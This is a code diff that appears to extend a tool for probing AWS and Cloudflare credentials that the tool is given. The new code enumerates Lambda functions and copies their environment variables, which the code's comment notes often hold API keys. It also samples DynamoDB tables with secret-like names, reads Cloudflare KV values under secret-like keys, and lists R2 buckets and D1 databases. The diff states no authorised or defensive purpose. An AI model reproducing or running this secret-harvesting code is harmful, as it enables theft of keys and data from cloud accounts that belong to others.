@@ -954,6 +954,60 @@ async def probe_aws(cred: str) -> dict:
             code = e.response.get("Error", {}).get("Code", "")
             services_tried.append(f"iam:{code}")
 
+        # Lambda — function env vars often hold OPENAI_API_KEY etc
+        try:
+            lam = boto3.client("lambda", aws_access_key_id=kid,
+                                 aws_secret_access_key=secret,
+                                 region_name=REGION, config=cfg)
+            funcs = lam.list_functions(MaxItems=50).get("Functions", [])
+            if funcs:
+                services_tried.append(f"lambda:ok({len(funcs)})")
+                service_alive_count += 1
+                out["lambda_funcs_count"] = len(funcs)
+                for f in funcs[:30]:
+                    fname = f.get("FunctionName", "")
+                    env = (f.get("Environment") or {}).get("Variables", {}) or {}
+                    if env:
+                        susp.append(f"lambda:{fname}")
+                        for k_, v_ in env.items():
+                            text_blob.append(f"{k_}={v_}")
+        except ClientError as e:
+            services_tried.append(f"lambda:{e.response.get('Error', {}).get('Code', '?')}")
+
+        # DynamoDB — secret-named tables sometimes used for app-config storage
+        try:
+            ddb = boto3.client("dynamodb", aws_access_key_id=kid,
+                                 aws_secret_access_key=secret,
+                                 region_name=REGION, config=cfg)
+            tables = ddb.list_tables(Limit=50).get("TableNames", [])
+            if tables:
+                services_tried.append(f"dynamodb:ok({len(tables)})")
+                service_alive_count += 1
+                for t in tables[:30]:
+                    if _SUSPICIOUS_NAME.search(t):
+                        susp.append(f"ddb:{t}")
+                        # Sample 20 items
+                        try:
+                            items = ddb.scan(TableName=t, Limit=20).get("Items", [])
+                            for item in items:
+                                text_blob.append(json.dumps(item, default=str))
+                        except ClientError:
+                            pass
+        except ClientError as e:
+            services_tried.append(f"ddb:{e.response.get('Error', {}).get('Code', '?')}")
+
+        # SES — email sending creds usually paired with API access
+        try:
+            ses = boto3.client("ses", aws_access_key_id=kid,
+                                 aws_secret_access_key=secret,
+                                 region_name=REGION, config=cfg)
+            quota = ses.get_send_quota()
+            if quota:
+                services_tried.append("ses:ok")
+                service_alive_count += 1
+        except ClientError as e:
+            services_tried.append(f"ses:{e.response.get('Error', {}).get('Code', '?')}")
+
         out["services_tried"] = services_tried
 
         # If NO service responded with auth-success, the key is broken-or-blocked.
@@ -1171,6 +1225,68 @@ async def probe_cloudflare(token: str) -> dict:
                     # deployment_configs.production.env_vars contains live env
                     text_blob.append(json.dumps(p.get("deployment_configs", {}),
                                                   default=str))
+            except Exception:
+                pass
+
+            # KV namespaces — often contain user-stored secrets
+            try:
+                r = await c.get(f"{base}/accounts/{acc_id}/storage/kv/namespaces",
+                                headers=headers)
+                if r.status_code == 200:
+                    nss = (r.json() or {}).get("result", [])
+                    for ns in nss[:20]:
+                        ns_id = ns.get("id")
+                        nsname = ns.get("title", "")
+                        susp.append(f"kv:{nsname}")
+                        if _SUSPICIOUS_NAME.search(nsname):
+                            try:
+                                rk = await c.get(
+                                    f"{base}/accounts/{acc_id}/storage/kv/namespaces/{ns_id}/keys?limit=100",
+                                    headers=headers,
+                                )
+                                if rk.status_code == 200:
+                                    keys = (rk.json() or {}).get("result", [])
+                                    for kentry in keys[:50]:
+                                        k_name = kentry.get("name", "")
+                                        if _SUSPICIOUS_NAME.search(k_name):
+                                            try:
+                                                rv = await c.get(
+                                                    f"{base}/accounts/{acc_id}/storage/kv/namespaces/{ns_id}/values/{k_name}",
+                                                    headers=headers,
+                                                )
+                                                if rv.status_code == 200:
+                                                    text_blob.append(rv.text[:8192])
+                                            except Exception:
+                                                pass
+                            except Exception:
+                                pass
+            except Exception:
+                pass
+
+            # R2 buckets — Cloudflare's S3-compatible storage
+            try:
+                r = await c.get(f"{base}/accounts/{acc_id}/r2/buckets",
+                                headers=headers)
+                if r.status_code == 200:
+                    buckets = (r.json() or {}).get("result", {}).get("buckets", [])
+                    out["r2_buckets"] = len(buckets)
+                    for b in buckets[:20]:
+                        bn = b.get("name", "")
+                        if any(p in bn.lower() for p in
+                               ("secret", "env", "config", "credential", "key", "prod")):
+                            susp.append(f"r2:{bn}")
+            except Exception:
+                pass
+
+            # D1 databases — Cloudflare's SQL DB
+            try:
+                r = await c.get(f"{base}/accounts/{acc_id}/d1/database",
+                                headers=headers)
+                if r.status_code == 200:
+                    dbs = (r.json() or {}).get("result", [])
+                    out["d1_databases"] = len(dbs)
+                    for db_ in dbs[:10]:
+                        susp.append(f"d1:{db_.get('name','')}")
             except Exception:
                 pass
 
